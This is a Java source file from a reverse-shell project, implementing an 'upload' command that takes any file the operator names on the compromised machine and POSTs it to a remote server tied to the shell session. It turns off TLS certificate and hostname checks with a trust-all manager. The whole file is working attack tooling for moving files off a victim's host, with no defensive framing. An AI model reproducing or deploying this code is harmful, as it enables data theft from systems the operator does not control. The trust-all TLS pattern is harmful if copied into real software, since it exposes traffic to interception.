package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.model.CommandRestOutput;
import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.util.Constants;
import com.mtattab.reverseshell.util.DataManipulationUtil;
import com.mtattab.reverseshell.util.ReverseShellSession;
import com.mtattab.reverseshell.util.SystemCommandProxyUtil;
import okhttp3.*;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.File;
import java.io.IOException;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;

public class UploadToS3Command implements Command {

    TrustManager[] trustAllCertificates;

    @Override
    public CommandRestOutput executeCommand(String command) {
        List<String> commands = new ArrayList<>( DataManipulationUtil.stringToList(command, " "));
//        edge cases
        if (commands.get(0).equalsIgnoreCase("upload")){
            commands.remove(0);
            return CommandRestOutput.builder().output(uploadToS3(String.join(" ", commands)))
                    .build() ;

        }
        return null;
    }

    private String uploadToS3(String path) {
        File relativeFile = new File(SystemCommandProxyUtil.currentWorkingDir, path);
        File absoluteFile = new File(path);
        File fileToUpload = null;



        if (relativeFile.exists() && relativeFile.isFile()) {
            fileToUpload = relativeFile;
        } else if (absoluteFile.exists() && absoluteFile.isFile()) {

            fileToUpload = absoluteFile;
        } else {
            return "File not found: " + path;
        }


        try {
            Response response= uploadFile(fileToUpload);
            System.out.println(response);

            return "File: "+fileToUpload.getName()+" was sent to api endpoint. Api output: "+ response.body().string() ;
        }catch (Exception e){
            e.printStackTrace();
            return "failed with error: " +e.getMessage();

        }


    }




    private Response uploadFile(File fileToUpload) throws IOException {
        SSLContext sslContext= createInsecureSslContext();

        String uri = Constants.LOCAL_SERVER_HTTP_URI+
                Constants.S3_API_ENDPOINT+
                Constants.S3_API_UPLOAD+
                Constants.S3_API_UPLOAD_SESSION_PARAM+ ReverseShellSession.getSessionId();

        OkHttpClient client = new OkHttpClient().newBuilder()
                .hostnameVerifier( (s, sslSession) -> true) // Disable hostname verification
                .sslSocketFactory(sslContext.getSocketFactory(),(X509TrustManager) trustAllCertificates[0])

                .build();



        RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("file",fileToUpload.getName(),

                        RequestBody.create(MediaType.parse("application/octet-stream"),
                                fileToUpload))
                .build();

        Request request = new Request.Builder()
                .url(uri)
                .method("POST", body)
                .build();

        Response response = client.newCall(request).execute();

        return response;
    }


    private SSLContext createInsecureSslContext() {
        SSLContext sslContext = null;
        try {
            sslContext = SSLContext.getInstance("TLS");

            // Create a TrustManager that trusts all certificates
            this.trustAllCertificates = new TrustManager[]{
                    new X509TrustManager() {
                        public X509Certificate[] getAcceptedIssuers() {
                            return new X509Certificate[0];
                        }

                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        }
                    }
            };

            sslContext.init(null, trustAllCertificates, new SecureRandom());



        }catch (Exception e){
            e.printStackTrace();

        }

        return sslContext;

    }



}
